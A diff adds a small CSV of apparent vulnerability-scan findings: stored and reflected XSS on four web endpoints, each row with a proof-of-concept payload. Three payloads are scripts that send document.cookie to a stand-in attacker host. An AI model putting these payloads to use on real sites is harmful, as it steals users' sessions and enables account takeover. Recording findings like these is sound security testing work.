@@ -1,0 +1,5 @@
+run_id,endpoint,vulnerability,poc
+20260903-1022-0012,`POST /create_post`,Stored XSS,"`<script>var u=""http://attacker.example/?c=""+document.cookie;new Image().src=u</script>`"
+20260903-1022-0012,`POST /edit_post`,Stored XSS,"`<script>var u=""http://attacker.example/?c=""+document.cookie;new Image().src=u</script>`"
+20260903-1022-0012,`GET /users?search=`,Reflected XSS,"`""><script>document.location=""http://attacker.example.com/steal?c=""+document.cookie</script>`"
+20260903-1022-0012,`POST /request_friend`,Reflected XSS,"`username=""><script>document.cookie</script>`"
